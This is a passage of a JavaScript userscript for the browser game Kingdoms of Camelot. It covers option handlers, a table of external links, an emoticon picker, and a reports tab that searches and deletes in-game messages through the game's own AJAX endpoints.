	t.changeColorLayout ('togdevCreditsFontCol', 'devCreditsFontCol');
	t.changeColorLayout ('togChatLinkColGlobal', 'ChatLinkColGlobal');
	t.changeColorLayout ('togChatLinkColAlly', 'ChatLinkColAlly');	t.changeColorLayout ('togChatLinkContentColor', 'ChatLinkContentColor');
	t.changeColorLayout ('togSayToAlliCol', 'SayToAlliCol');	t.changeColorLayout ('togSayToGlobalCol', 'SayToGlobalCol');
	t.changeColorLayout ('togmodCommForumAhover', 'modCommForumAhover');	t.changeColorLayout ('togmodCommForumA', 'modCommForumA');
	t.changeColorLayout ('togMainFont', 'MainFont');	t.changeColorLayout ('togMainBody', 'MainBody');
	t.changeColorLayout ('togMainBodyDark', 'MainBodyDark');	t.changeColorLayout ('togChatFontColor', 'ChatFontColor');
	t.togOpt ('togChatBGColorGlobal', 'ChatBGColorGlobal');	t.togOpt ('togChatBGColorAlliance', 'ChatBGColorAlliance');	t.togOpt ('togChatBGImageGlobal', 'ChatBGImageGlobal');	t.togOpt ('togChatBGImageAlliance', 'ChatBGImageAlliance');
	t.changeColorLayout ('togOwnBackgroundColorGlobal', 'OwnBackgroundColorGlobal');	t.changeColorLayout ('togOwnBackgroundColorAlliance', 'OwnBackgroundColorAlliance');
	t.changeOpt ('togdevBG', 'devBG');	t.changeOpt ('togpdxDeskInfoBG', 'pdxDeskInfoBG');
	t.changeOpt ('togownWP', 'ownWP');	t.changeOpt ('togownWPdark', 'ownWPdark');
	t.changeOpt ('togpdxQuickInfoBG', 'pdxQuickInfoBG');	
	t.changeOpt ('togOwnBackGroundGlobal', 'OwnBackGroundGlobal');	t.changeOpt ('togOwnBackGroundAlliance', 'OwnBackGroundAlliance');
	
    } catch (e) {
	  div.innerHTML = '<PRE>'+ e.name +' : '+ e.message +'</pre>';
    }
  },
   
/**********************************************************/
/************ KOC POWER - EXTRAS/LINKS ***************OK**/
/********************************************************/
 showXtrLink : function (){
  div = document.createElement('div');
    var t = Tabs.Options;
      try {
    m = '<DIV class=pdxStat>'+culang.Huselink+'</div>\
    <table class=pdxTab align="center" width="700" border="0" cellspacing="0" cellpadding="0">\
    <tr><td width="57"><b>No.</b></td>\
    <td width="343"><b><center>Topic</center></b></td>\
    <td width="156"><b><center>Website Address</center></b></td></tr>\
    <tr><td><b># 1</b></td>\
    <td><center><a href="http://www.gamerspost.net/games-on-facebook/kingdoms-of-camelot-%E2%80%93-tips-tricks-cheats-and-strategies/" target=_blank>Tips und Tricks</a></center></td>\ <td><center><a href="http://www.gamerspost.net/games-on-facebook/kingdoms-of-camelot-%E2%80%93-tips-tricks-cheats-and-strategies/" target="_blank">www.gamerspost.net</a></center></td></tr>\
    <tr><td><b># 2</b></td>\
    <td><center><a href="http://koc.dunno.com/index.sjs?f=KocMapViewer&server_id=11" target="_blank">Virtual Player Locator Map of Llamrei Domain (11)</a></center></td>\
    <td><center><a href="http://koc.dunno.com/index.sjs?f=KocMapViewer&server_id=11" target="_blank">koc.dunno.com</a></center></td></tr>\
    <tr><td><b># 3</b></td>\
    <td><center><a href="http://koc.dunno.com/index.sjs?f=KocMapViewer&server_id=54" target="_blank">Virtual Player Locator Map of Rhon Domain (54)</a></center></td>\
    <td><center><a href="http://koc.dunno.com/index.sjs?f=KocMapViewer&server_id=54" target="_blank">koc.dunno.com</a></center></td></tr>\
    <tr><td><b># 4</b></td>\
    <td><center><a href="http://koc.dunno.com/index.sjs?f=KocMapViewer&server_id=62" target="_blank">Virtual Player Locator Map of Culwich Domain (62) </a></center></td>\
    <td><center><a href="http://koc.dunno.com/index.sjs?f=KocMapViewer&server_id=62" target="_blank">koc.dunno.com</a></center></td></tr>\
	<tr><td><b># 5</b></td>\
    <td><center><a href="http://www.4crests.com/coat-of-arms-search.html" target="_blank">Coat of Arms & Family Crest Search</a></center></td>\
    <td><center><a href="http://www.4crests.com/coat-of-arms-search.html" target="_blank">www.4crests.com</a></center></td></tr>\
    <tr><td><b># 6</b></td>\
    <td><center><a href=http://www.dailymotion.com/video/xgk5zw_free-gems-and-coins-for-kingdoms-of-camelot-on-facebook_videogames" target="_blank">Free Gems in Kingdoms of Camelot </a></center></td>\
    <td><center><a href="http://www.dailymotion.com/video/xgk5zw_free-gems-and-coins-for-kingdoms-of-camelot-on-facebook_videogames" target="_blank">www.dailymotion.com</a></center></td></tr>\
	</table>\
	<br><td><center><b>If you would like your domain added to the Virtual Domain Map list ...<br>Email me at larry@lwharrell.com</b></center></td>\
    <DIV class=pdxStat>'+culang.HmoreInfo+'</div><TABLE class=pdxTab><TD width="300px">Kingdom of Camelot - Client '+culang.scriptv+': <span class=boldRed>'+ KOCversion +'</span></td>\
    <TD><INPUT id=ptButDebug type=submit name="SEED" value="DEBUG"></td></table></div>\
           <HR><u>'+culang.impnote+'</u>: '+culang.Onote +'\<br><br>\
           <td colspan="3"><tr><table width="980" border="0" cellspacing="0" cellpadding="0"><tr>\
           <td colspan="3"><center><b><b><a href="http://userscripts.org/scripts/show/114635" target="_blank">KoC Power Max </b><span class="boldRed">Version 1.2.4.1 </span>Re-edited by Larry W. Harrell, Powered by KoC Power MulitLang Version 1.2.4 by PDX)</a></b></center></td>\
           <tr><td><center><a href="http://userscripts.org/scripts/show/114635" target="_blank"><br><img src="http://www.lwharrell.com/KOC/images/LWHKOCPwrlogo.png" alt="KoC Scripts by LWH" width="400" height="78"><a href="http://userscripts.org/scripts/show/114635" target="_blank"><span class="boldRed"><BR>Click here to get latest version... ! <br></a></span></center></td>\
           </table></div>';
   
	t.optionsDiv.innerHTML = m;

    document.getElementById('ptButDebug').addEventListener('click', function (){debugWin.doit()}, false);  
    } catch (e) {
	  div.innerHTML = '<PRE>'+ e.name +' : '+ e.message +'</pre>';
    }
  },
  
  //OPTIONS FUNCTION
   togPDXCOpt : function (checkboxId, optionName, callOnChange, callEnable,callIsAvailable){
    var t = Tabs.Options;
    var checkbox = document.getElementById(checkboxId);

    if (callIsAvailable && callIsAvailable()==false){
      checkbox.disabled = true;
      return;
    }
    if (PDXCountOpt[optionName])
      checkbox.checked = true;
    checkbox.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      PDXCountOpt[optionName] = this.checked;
      savePDXCountOpt();
      if (callOnChange)
        callOnChange (this.checked);
    }
  },
  changePDXCOpt : function (valueId, optionName, callOnChange){
    var t = Tabs.Options;
    var e = document.getElementById(valueId);
    e.value = PDXCountOpt[optionName];
    e.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      PDXCountOpt[optionName] = this.value;
      savePDXCountOpt();
      if (callOnChange)
        callOnChange (this.value);
    }
  },
  togpdxSO : function (checkboxId, optionName, callOnChange, callEnable,callIsAvailable){
    var t = Tabs.Options;
    var checkbox = document.getElementById(checkboxId);

    if (callIsAvailable && callIsAvailable()==false){
      checkbox.disabled = true;
      return;
    }
    if (StyleOptions[optionName])
      checkbox.checked = true;
    checkbox.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      StyleOptions[optionName] = this.checked;
      saveStyleOptions();
      if (callOnChange)
        callOnChange (this.checked);
    }
  },
  changepdxSO : function (valueId, optionName, callOnChange){
    var t = Tabs.Options;
    var e = document.getElementById(valueId);
    e.value = StyleOptions[optionName];
    e.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      StyleOptions[optionName] = this.value;
      saveStyleOptions();
      if (callOnChange)
        callOnChange (this.value);
    }
  },
  togColor : function (checkboxId, optionName, callOnChange, callEnable,callIsAvailable){
    var t = Tabs.Options;
    var checkbox = document.getElementById(checkboxId);

    if (callIsAvailable && callIsAvailable()==false){
      checkbox.disabled = true;
      return;
    }
    if (Colors[optionName])
      checkbox.checked = true;
    checkbox.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Colors[optionName] = this.checked;
      saveColors();
      if (callOnChange)
        callOnChange (this.checked);
    }
  },
 changeColorLayout : function (valueId, optionName, callOnChange){
    var t = Tabs.Options;
    var e = document.getElementById(valueId);
    e.value = Colors[optionName];
    e.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Colors[optionName] = this.value;
      saveColors();
	  t.showLayoutWallpaper();
      if (callOnChange)
        callOnChange (this.value);
    }
  },
  changeColor : function (valueId, optionName, callOnChange){
    var t = Tabs.Options;
    var e = document.getElementById(valueId);
    e.value = Colors[optionName];
    e.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Colors[optionName] = this.value;
      saveColors();
	  t.showColors();
      if (callOnChange)
        callOnChange (this.value);
    }
  },
    changeColorOpt : function (valueId, optionName, callOnChange){
    var t = Tabs.Options;
    var e = document.getElementById(valueId);
    e.value = Colors[optionName];
    e.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Colors[optionName] = this.value;
      saveColors();
      if (callOnChange)
        callOnChange (this.value);
    }
  },
  changePlayerCol : function (valueId, optionName, callOnChange){
    var t = Tabs.Options;
    var e = document.getElementById(valueId);
    e.value = Colors[optionName];
    e.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Colors[optionName] = this.value;
      saveColors();
	  t.showPlayers();
      if (callOnChange)
        callOnChange (this.value);
    }
  },
  togOpt : function (checkboxId, optionName, callOnChange, callEnable,callIsAvailable){
    var t = Tabs.Options;
    var checkbox = document.getElementById(checkboxId);

    if (callIsAvailable && callIsAvailable()==false){
      checkbox.disabled = true;
      return;
    }
    if (Options[optionName])
      checkbox.checked = true;
    checkbox.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Options[optionName] = this.checked;
      saveOptions();
      if (callOnChange)
        callOnChange (this.checked);
    }
  },
	changeOpt : function (valueId, optionName, callOnChange){
	var t = Tabs.Options;
	var e = document.getElementById(valueId);
	e.value = Options[optionName];
	e.addEventListener ('change', eventHandler, false);
	function eventHandler (){
	  Options[optionName] = this.value;
	  saveOptions();
	  if (callOnChange)
		callOnChange (this.value);
	  }
	},
  
	e_watchChanged : function (){
	GlobalOptions.pbWatchdog = document.getElementById('pbWatchEnable').checked;
	GM_setValue ('GlobalOptions_??', JSON2.stringify(GlobalOptions));
	saveGlobalOptions();	
	},
	e_wideChanged : function (){
	GlobalOptions.pbWideScreen = document.getElementById('pbWideOpt').checked;
	GM_setValue ('GlobalOptions_??', JSON2.stringify(GlobalOptions));  
	saveGlobalOptions();
	},
  e_updateChanged : function (){
    GlobalOptions.pbupdate = document.getElementById('pbupdate').checked;
    GM_setValue ('GlobalOptions_??', JSON2.stringify(GlobalOptions));
	saveGlobalOptions();
  },
  EmoClick: function(what) {
  document.getElementById ("mod_comm_input").value += " " + what + " ";
  }, 
  EmoHelp : function (){
	var t = Tabs.Options;
	unsafeWindow.pdxEmoClick = t.EmoClick;
	var helpText = '<DIV style="max-height:195px; overflow-y:auto">';
	helpText += '<TABLE width=95% cellspacing=0 cellpadding=4 border=1 bordercolor=black>';
	helpText += '<TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00100-smile.gif\" onclick="pdxEmoClick(\':-)\')"></td><TD>:) :-) :=) ^^</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00101-sadsmile.gif\" onclick="pdxEmoClick(\':-(\')"></td><TD>:-( :=(</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00102-bigsmile.gif\" onclick="pdxEmoClick(\':-D\')"></td><TD>:D :-D :=D</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00106-crying.gif\" onclick="pdxEmoClick(\';-(\')"></td><TD>;-( ;=(</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00109-kiss.gif\" onclick="pdxEmoClick(\':-*\')"></td><TD>:-* :=*</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00112-wondering.gif\" onclick="pdxEmoClick(\':^)\')"></td><TD>:^)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00105-wink.gif\" onclick="pdxEmoClick(\';-)\')"></td><TD>;-) ;=)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00113-sleepy.gif\" onclick="pdxEmoClick(\'I-)\')"></td><TD>I-) I=)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00103-cool.gif\" onclick="pdxEmoClick(\'8-)\')"></td><TD>8-) 8=) B-) B=)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00121-angry.gif\" onclick="pdxEmoClick(\'x=(\')"></td><TD>x=( x-( :-@ :=@</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00119-puke.gif\" onclick="pdxEmoClick(\':-& \')"></td><TD>:-& :=&</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00107-sweating.gif\" onclick="pdxEmoClick(\'(:I\')"></td><TD>(:I</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00110-tongueout.gif\" onclick="pdxEmoClick(\':=P\')"></td><TD>:P :=P :-P :=p</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00111-blush.gif\" onclick="pdxEmoClick(\':-$\')"></td><TD>:-$ :=$ :"></td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00123-party.gif\" onclick="pdxEmoClick(\'(party)\')"></td><TD>(party)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00176-smoke.gif\" onclick="pdxEmoClick(\'(ci)\')"></td><TD>(smoke) (smoking) (ci) (rauchen)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00181-fubar.gif\" onclick="pdxEmoClick(\'(fubar)\')"></td><TD>(fubar)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00115-inlove.gif\" onclick="pdxEmoClick(\'(inlove)\')"></td><TD>(inlove)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00128-hi.gif\" onclick="pdxEmoClick(\'(bj)\')"></td><TD>(hi)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00137-clapping.gif\" onclick="pdxEmoClick(\'(clap)\')"></td><TD>(clap) (bravo) (klatschen)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00140-rofl.gif\" onclick="pdxEmoClick(\'(rofl)\')"></td><TD>(rofl)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00168-drink.gif\" onclick="pdxEmoClick(\'(drink)\')"></td><TD>(drink)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00162-coffee.gif\" onclick="pdxEmoClick(\'(cafe)\')"></td><TD>(cafe) (kaffee) (coffee)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00154-mail.gif\" onclick="pdxEmoClick(\'(m)\')"></td><TD>(m) (e)</td></tr><TR><TD><img class=emoicon src=\"http://factoryjoe.s3.amazonaws.com/emoticons/emoticon-0180-bug.gif\" onclick="pdxEmoClick(\'(bug)\')"></td><TD>(bug)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00134-bear.gif\" onclick="pdxEmoClick(\'(bear)\')"></td><TD>(bear)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00118-yawn.gif\" onclick="pdxEmoClick(\'I()\')"></td><TD>I()</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/like.gif\" onclick="pdxEmoClick(\'(like)\')"></td><TD>(like)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00116-evilgrin.gif\" onclick="pdxEmoClick(\'(evilgrin)\')"></td><TD>]: >:) </td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/poolparty.gif\" onclick="pdxEmoClick(\'(pool)\')"></td><TD>(pool)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_bandit.gif\" onclick="pdxEmoClick(\'(bandit)\')"></td><TD>(bandit)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_drunk.gif\" onclick="pdxEmoClick(\'(drunk)\')"></td><TD>(drunk)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_finger.gif\" onclick="pdxEmoClick(\'(finger)\')"></td><TD>(finger)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_mooning.gif\" onclick="pdxEmoClick(\'(mooning)\')"></td><TD>(mooning)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_rock.gif\" onclick="pdxEmoClick(\'(rock)\')"></td><TD>(rock)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/swear.gif\" onclick="pdxEmoClick(\'(swear)\')"></td><TD>(swear)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/tmi.gif\" onclick="pdxEmoClick(\'(tmi)\')"></td><TD>(tmi)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_toivo.gif\" onclick="pdxEmoClick(\'(toivo)\')"></td><TD>(toivo)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype-wackyb-0139-1-bow.gif\" onclick="pdxEmoClick(\'(bow)\')"></td><TD>(bow)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00170-ninja.gif\" onclick="pdxEmoClick(\'(ninja)\')"></td><TD>(ninja)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00167-beer.gif\" onclick="pdxEmoClick(\'(beer)\')"></td><TD>(beer)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00165-muscle.gif\" onclick="pdxEmoClick(\'(muscle)\')"></td><TD>(muscle)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00163-pizza.gif\" onclick="pdxEmoClick(\'(pizza)\')"></td><TD>(pizza)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00159-music.gif\" onclick="pdxEmoClick(\'(music)\')"></td><TD>(music)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00146-punch.gif\" onclick="pdxEmoClick(\'(punch)\')"></td><TD>(punch)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00148-yes.gif\" onclick="pdxEmoClick(\'(yes)\')"></td><TD>(yes)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00150-handshake.gif\" onclick="pdxEmoClick(\'(handshake)\')"></td><TD>(handshake)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00149-no.gif\" onclick="pdxEmoClick(\'(no)\')"></td><TD>(no)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00155-flower.gif\" onclick="pdxEmoClick(\'(flower)\')"></td><TD>(flower)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00161-phone.gif\" onclick="pdxEmoClick(\'(phone)\')"></td><TD>(phone)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_headbang.gif\" onclick="pdxEmoClick(\'(headbang)\')"></td><TD>(headbang)</td></tr>';
	helpText += '<TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/glory.png\" onclick="pdxEmoClick(\'(glory)\')"></td><TD> (glory) (fight) </td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/dontlike.gif\" onclick="pdxEmoClick(\'(dontlike)\')"></td><TD> (dontlike) </td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/heart.png\" onclick="pdxEmoClick(\'<3\')"></td><TD> <3 </td></tr><TR><TD><img class=emoicon src=\"http://koc.god-like.info/pdx.gif\" onclick="pdxEmoClick(\'(pdx)\')"></td><TD>(pdx) (nessaja) (ksx) (jontey)</td></tr>';
	helpText += '</table></div>';

	var inputtext=document.getElementById('mod_comm_input');
	var pop = new CPopup ('EmoHelp', 0, 0, 746, 100, true);
	//pop.centerMe (mainPop.getMainDiv()); 
	pop.getMainDiv().innerHTML = helpText;
	pop.getTopDiv().innerHTML = '<div class=showBadged><center>'+culang.Osmileys+'</div></center>';
	pop.show (true);
	// document.getElementById("EmoHelp_outer").style.top = (getOffset(inputtext).top+25) +'px';
	// document.getElementById("EmoHelp_outer").style.left = (getOffset(inputtext).left+100) +'px';
  },

  
};
// END OPTIONS TAB
/****************************************************************************/
/************ KOC POWER - TABS REPORT **************************************/
/**************************************************************************/
Tabs.Reports = {
	tabLabel : culang.report,
	tabOrder : StyleOptions.toMitteilung,
	cont:			null,
	state:			null,
	minPages:		parseInt(Options.arPageFrom),
	maxPages:		parseInt(Options.arPageTo),
	data:			[],
	dataDF:	[],dataAT:	[],
	report:			[],
	reportDF:		[],
	reportAT:		[],
	totalPages:	parseInt(Options.arPageTo),
	what:			'',
	whatNot:		'',
	content:		'',

  show : function () {

    var t = Tabs.Reports;
    if (Options.RptAuto) t.handleRptSearch();
  },
	hide : function (){
  	},

	init : function (div) {
		var t = Tabs.Reports;
		t.cont = div;
		unsafeWindow.getmsg = t.getMailBody;
		unsafeWindow.DelMail = t.DeleteMail;
		unsafeWindow.getReport = t.getReportBody;
		unsafeWindow.DelReport = t.DeleteReport;
	        var tc = '<DIV class=pdxStat>'+culang.Hreport+'</DIV><DIV class=pdxEntry><TABLE><TR align=center valign=center>';
		tc += '<TD class=xtab align=right><select id=idRptFiltre1><option value="">'+culang.OwideOptnormal+'</option><option value="0">'+culang.wild+'</option><option value=54>'+culang.darkforest+'</option></select> '+culang.type+': <SELECT id="idRptType">';
		tc += '<OPTION value="alliance" ' + (Options.rptType=='alliance'?'SELECTED':'') + '>'+culang.alliance+' '+culang.report+'</OPTION>';
		tc += '<OPTION value="player" ' + (Options.rptType=='player'?'SELECTED':'') + '>'+culang.player+' '+culang.report+'</OPTION>';
		tc += '<OPTION value="inbox" ' + (Options.rptType=='inbox'?'SELECTED':'') + '>'+culang.rptinbox+'</OPTION>';
		tc += '<OPTION value="outbox" ' + (Options.rptType=='outbox'?'SELECTED':'') + '>'+culang.rptoutbox+'</OPTION></SELECT>';
		tc += '<BR /><INPUT id=idRptSearch type=submit value="'+culang.search+'" /> '+culang.rptauto+':<input type=checkbox id="idRptAuto" ' +(Options.RptAuto?'CHECKED':'')+'> '+culang.page+':&nbsp;<INPUT id="idRptPageFrom" size=1 value="' + Options.arPageFrom + '">&#8211;<INPUT id="idRptPageTo" size=1 value="' + Options.arPageTo + '"></TD>';
		tc += '<TD class=xtab align=right>'+culang.from+':&nbsp;<SELECT id="idRptAttacker">'; // Options.arPageFrom - Options.arPageTo
		tc += '<OPTION value="Them" ' + (Options.arAttacker=='Them'?'SELECTED':'') + '>'+culang.attacker+'</OPTION>';
		tc += '<OPTION value="Us" ' + (Options.arAttacker=='Us'?'SELECTED':'') + '>'+culang.alliance+'</OPTION>';
		tc += '<OPTION value="Both" ' + (Options.arAttacker=='Both'?'SELECTED':'') + '>'+culang.both+'</OPTION></SELECT>';
		tc += '<BR />'+culang.target+':&nbsp;<SELECT id="idRptTarget">';
		tc += '<OPTION value="Them" ' + (Options.arTarget=='Them'?'SELECTED':'') + '>'+culang.attacker+'</OPTION>';
		tc += '<OPTION value="Us" ' + (Options.arTarget=='Us'?'SELECTED':'') + '>'+culang.alliance+'</OPTION>';
		tc += '<OPTION value="Both" ' + (Options.arTarget=='Both'?'SELECTED':'') + '>'+culang.both+'</OPTION></SELECT></TD>';
		tc += '<TD class=xtab align=right>'+culang.searchfor+':&nbsp;<INPUT id=idRptWhat type=text size=11 maxlength=50 value=""><BR />';
		tc += ''+culang.diff+':&nbsp;<INPUT id=idRptWhatNot type=text size=11 maxlength=50 value=""></TD>';
		tc += '<TD class=xtab align=left><INPUT id=idRptAttack type=checkbox '+(Options.arAttack?'CHECKED':'')+' />&nbsp;'+culang.rptattack+'<BR />';
		tc += '<INPUT id=idRptScout type=checkbox '+(Options.arScout?'CHECKED':'')+' />&nbsp;'+culang.scout+'</TD>';
		tc += '<TD class=xtab align=left><INPUT id=idRptReinforce type=checkbox '+(Options.arReinforce?'CHECKED':'')+' />&nbsp;'+culang.rptreinforce+'<BR />';
		tc += '<INPUT id=idRptTransport type=checkbox '+(Options.arTransport?'CHECKED':'')+' />&nbsp;'+culang.transport+'</TD>';
		tc += '<TD class=xtab align=left></TD></TR><TR><TD class=xtab><input type=checkbox id=AttackSummary> '+culang.rptsummary+' </td></tr></TABLE></DIV>';
		tc += '<DIV class=pdxStat><TABLE width=100% cellspacing=0><TR><TD class=xtab align=left width=125><DIV id=idRptSearched></DIV></TD></TD>';
		tc += '<TD class=xtab><TD class=xtab align=center><SPAN style="white-space:normal" id=idRptStatus>&nbsp;</span></TD></TD>';
		tc += '<TD class=xtab><TD class=xtab align=right width=125><DIV id=idRptFound></DIV></TD></TR></TABLE></DIV>';
		tc += '<DIV id="ReportResultDiv" style="max-height: 750px; overflow:auto; white-space:nowrap;"></DIV>';
		
		t.cont.innerHTML = tc;
		document.getElementById('idRptType').addEventListener ('change', t.handleRptType, false);
		document.getElementById('idRptPageFrom').addEventListener ('change', t.handleRptPages, false);
		document.getElementById('idRptPageTo').addEventListener ('change', t.handleRptPages, false);
		document.getElementById('idRptAttacker').addEventListener ('change', t.handleRptAttacker, false);
		document.getElementById('idRptTarget').addEventListener ('change', t.handleRptTarget, false);
		document.getElementById('idRptWhat').addEventListener ('keyup', t.handleRptWhat, false);
		document.getElementById('idRptWhatNot').addEventListener ('keyup', t.handleRptWhatNot, false);
		document.getElementById('idRptSearch').addEventListener ('click', t.handleRptSearch, false);
		document.getElementById('idRptFiltre1').addEventListener ('change', t.handleRptWhat, false);

	
		t.togOpt ('idRptAttack', 'arAttack');
		t.togOpt ('idRptScout', 'arScout');
		t.togOpt ('idRptReinforce', 'arReinforce');
		t.togOpt ('idRptTransport', 'arTransport');
		t.togOpt ('idRptAuto','RptAuto');
	},
	DeleteMail: function(rptid, type) {
   var t = Tabs.Reports;
   var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
   params.requestType="ACTION_ON_MESSAGES";
   params.selectedAction="delete";
   params.boxType=document.getElementById('idRptType').value;
   params.selectedMessageIds=rptid;

   new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getEmail.php" + unsafeWindow.g_ajaxsuffix, {
         method: "post",
         parameters: params,
         onSuccess: function (rslt) {
           if (rslt.ok) {
           
           t.handleRptSearch();
           
           }
           if (notify)
             notify (rslt.errorMsg);
         },
         onFailure: function () {
           if (notify)
             notify ('AJAX ERROR');
         },
       });
  },
  
  DeleteReport: function(rptid, isUnread) {
   var t = Tabs.Reports;
     
   var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
   params.s0rids = rptid;
   params.s1rids = '';
   params.cityrids = '';
   
   new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/deleteCheckedReports.php" + unsafeWindow.g_ajaxsuffix, {
         method: "post",
         parameters: params,
         onSuccess: function (rslt) {
           if (rslt.ok) {
           
           if (isUnread){
             unsafeWindow.seed.newReportCount = parseInt(unsafeWindow.seed.newReportCount) - 1;
             unsafeWindow.messages_notify_bug()
           } 
           //t.handleRptSearch();
           //t.DisplayRpt();
           }
    
         },
         onFailure: function () {
             t.handleRptSearch();
         },
       });
  },
	togOpt: function (checkboxId, optionName){
		var t = Tabs.Reports;
		var checkbox = document.getElementById(checkboxId);
		checkbox.addEventListener ('change', eventHandler, false);
		function eventHandler (){
			Options[optionName] = this.checked;
			saveOptions();
			if (t.data.length > 0)
				if (Options.rptType == 'alliance' || Options.rptType == 'player')
					t.DisplayRpt();
				else
					t.DisplayMail();
		}
	},

	handleRptType: function(){
		var t = Tabs.Reports;
		Options.rptType = document.getElementById("idRptType").value;
		saveOptions();
		document.getElementById("idRptSearched").innerHTML = '';
		document.getElementById("idRptStatus").innerHTML = '&nbsp;';
		document.getElementById("idRptFound").innerHTML = '';
		document.getElementById("ReportResultDiv").innerHTML = '';
	},

	handleRptPages: function(){
		var t = Tabs.Reports;
		t.minPages=parseInt(document.getElementById("idRptPageFrom").value);
		t.maxPages=parseInt(document.getElementById("idRptPageTo").value);
		if (t.maxPages < t.minPages) {
			t.maxPages = t.minPages;
			document.getElementById("idRptPageTo").value = t.maxPages;
		}
		Options.arPageFrom = t.minPages;
		Options.arPageTo = t.maxPages;
		saveOptions();
		t.totalPages=t.maxPages;
	},

	handleRptAttacker: function(){
		var t = Tabs.Reports;
		Options.arAttacker = document.getElementById("idRptAttacker").value;
		saveOptions();
		if ((Options.rptType == 'alliance' || Options.rptType == 'player') && t.data.length > 0)
			t.DisplayRpt();
	},

	handleRptTarget: function(){
		var t = Tabs.Reports;
		Options.arTarget = document.getElementById("idRptTarget").value;
		saveOptions();
		if ((Options.rptType == 'alliance' || Options.rptType == 'player') && t.data.length > 0)
